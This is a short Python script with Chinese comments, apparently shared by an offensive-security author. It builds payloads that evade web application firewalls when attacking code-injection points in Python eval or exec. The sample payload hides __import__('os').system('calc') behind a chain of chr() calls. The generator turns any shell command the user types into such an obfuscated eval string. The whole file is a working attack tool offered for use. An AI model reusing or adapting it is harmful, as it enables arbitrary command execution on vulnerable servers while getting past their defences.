#by leeya_bug

#原理: 适用于waf太猛无法使用__import__的场景
#适用于eval、exec等函数

#Payload: 
if False:
    eval('eval(a)',{'a':chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)+chr(40)+chr(39)+chr(111)+chr(115)+chr(39)+chr(41)+chr(46)+chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)+chr(40)+chr(39)+chr(99)+chr(97)+chr(108)+chr(99)+chr(39)+chr(41)+chr(32)})

#Payload生成
cmd = input('请输入命令: ')
a = f'''__import__('os').system('{cmd}')'''
a0 = str()
for i in a:
    a0 += f'chr({ord(i)})+'
print('''eval('eval(a)',{'a':''' + a0 + '''chr(32)})''')
